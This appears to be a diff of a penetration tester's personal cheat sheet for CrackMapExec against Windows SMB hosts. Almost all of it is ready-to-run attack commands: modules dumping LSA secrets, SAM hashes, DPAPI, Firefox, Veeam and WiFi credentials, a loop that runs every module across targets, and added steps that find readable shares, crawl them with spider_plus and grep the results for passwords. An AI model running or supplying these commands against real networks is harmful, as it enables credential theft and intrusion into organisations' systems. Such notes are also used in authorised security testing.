@@ -13,13 +13,33 @@ crackmap smb modules
 >>$ cme smb ip -d domain.com -u user -p 'pass' --veeam
 >>$ cme smb ip -d domain.com -u user -p 'pass' --wifi
 
-script
+script ^^
 >>>>
     echo "lsa\r\nsam\r\ndpapi\r\nfirefox\r\nveeam\r\nwifi" >> cme-modules.txt
     for i in $(cat cme-modules.txt); do cme smb ip -d domain.com -u user -p 'pass' --$i --log host-$i.log; done
 >>>>
 
+
 >>$ cme smb all-ips -d domain.com -u user -p 'pass' --shares --log shares.log
+>>>> grep -ai 'read' shares.log | grep -avi 'print\$' | grep -avi 'ipc\$' > readable-shares.txt
+##### need to add parsing for shares/ip and script it in for --patern
+
+>>$ cme smb share-ips -d domain.com -u user -p 'pass' --spider_plus --log spider_plus_tmp.log
+>>$ grep -ari 'password'
+
+##### sed -i '/\}\/'/d' spider_plus_tmp1.log
+##### need to direct multiple files to sed to remove garabge
+
+
+
+
+======================
+SMBeagle
+======================
+https://github.com/punk-security/smbeagle.git
+>>$ SMBeagle -h
+
+
 
 ======================
 crackmap smb modules
